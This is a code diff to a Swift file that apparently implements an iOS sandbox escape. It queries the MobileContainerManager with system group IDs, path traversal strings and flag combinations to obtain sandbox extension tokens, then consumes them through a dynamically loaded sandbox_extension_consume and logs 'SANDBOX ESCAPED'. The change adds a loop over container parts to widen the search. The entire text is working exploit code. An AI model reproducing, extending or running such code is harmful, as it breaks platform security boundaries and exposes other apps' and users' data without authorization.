@@ -378,52 +378,55 @@ public final class MCMContainer {
         
         let flagCombos: [UInt64] = [0x900000000, 0x8000000000, 0x800000000, 0x100000000]
         let classes: [MCMContainerClass] = [.systemGroup, .group]
+        let parts: [UInt64] = [3, 0]
         
         for sysGroupId in sysGroups {
             for cls in classes {
                 for traversal in traversalPaths {
                     for flags in flagCombos {
-                        guard let query = fns.create() else { continue }
-                        defer { fns.free(query) }
-                        
-                        fns.setClass(query, UInt64(cls.rawValue))
-                        
-                        guard let xpcID = fns.xpcStringCreate(sysGroupId) else { continue }
-                        defer { fns.xpcRelease(xpcID) }
-                        
-                        fns.setIdentifiers(query, xpcID)
-                        fns.setGroupIdentifiers(query, xpcID)
-                        
-                        traversal.withCString { domainPtr in
-                            fns.setPartDomain(query, domainPtr)
-                        }
-                        
-                        fns.setFlags(query, flags)
-                        fns.setPart(query, 0)
-                        
-                        guard let obj = fns.getSingleResult(query) else { continue }
-                        
-                        if let tokenPtr = fns.copySandboxToken(obj) {
-                            defer { free(tokenPtr) }
-                            if tokenPtr.pointee != 0 {
-                                let sandboxHandle = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY) ?? UnsafeMutableRawPointer(bitPattern: -2)
-                                if let sbHandle = sandboxHandle,
-                                   let consumeSym = dlsym(sbHandle, "sandbox_extension_consume") {
-                                    typealias ConsumeFn = @convention(c) (UnsafePointer<CChar>?) -> Int64
-                                    let consume = unsafeBitCast(consumeSym, to: ConsumeFn.self)
-                                    let handle = consume(tokenPtr)
-                                    if handle >= 0 {
-                                        Self.consumedSandboxTokens.append(handle)
-                                        ContainerAccess.diag("[SBX] *** SANDBOX ESCAPED (R+W, handle=\(handle)) ***")
-                                        return true
+                        for part in parts {
+                            guard let query = fns.create() else { continue }
+                            defer { fns.free(query) }
+                            
+                            fns.setClass(query, UInt64(cls.rawValue))
+                            
+                            guard let xpcID = fns.xpcStringCreate(sysGroupId) else { continue }
+                            defer { fns.xpcRelease(xpcID) }
+                            
+                            fns.setIdentifiers(query, xpcID)
+                            fns.setGroupIdentifiers(query, xpcID)
+                            
+                            traversal.withCString { domainPtr in
+                                fns.setPartDomain(query, domainPtr)
+                            }
+                            
+                            fns.setFlags(query, flags)
+                            fns.setPart(query, part)
+                            
+                            guard let obj = fns.getSingleResult(query) else { continue }
+                            
+                            if let tokenPtr = fns.copySandboxToken(obj) {
+                                defer { free(tokenPtr) }
+                                if tokenPtr.pointee != 0 {
+                                    let sandboxHandle = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY) ?? UnsafeMutableRawPointer(bitPattern: -2)
+                                    if let sbHandle = sandboxHandle,
+                                       let consumeSym = dlsym(sbHandle, "sandbox_extension_consume") {
+                                        typealias ConsumeFn = @convention(c) (UnsafePointer<CChar>?) -> Int64
+                                        let consume = unsafeBitCast(consumeSym, to: ConsumeFn.self)
+                                        let handle = consume(tokenPtr)
+                                        if handle >= 0 {
+                                            Self.consumedSandboxTokens.append(handle)
+                                            ContainerAccess.diag("[SBX] *** SANDBOX ESCAPED (R+W, handle=\(handle)) ***")
+                                            return true
+                                        }
                                     }
                                 }
                             }
-                        }
-                        
-                        if fns.sandboxExtensionActivate(obj, false) {
-                            ContainerAccess.diag("[SBX] *** SANDBOX ACTIVATED via MCM ***")
-                            return true
+                            
+                            if fns.sandboxExtensionActivate(obj, false) {
+                                ContainerAccess.diag("[SBX] *** SANDBOX ACTIVATED via MCM ***")
+                                return true
+                            }
                         }
                     }
                 }
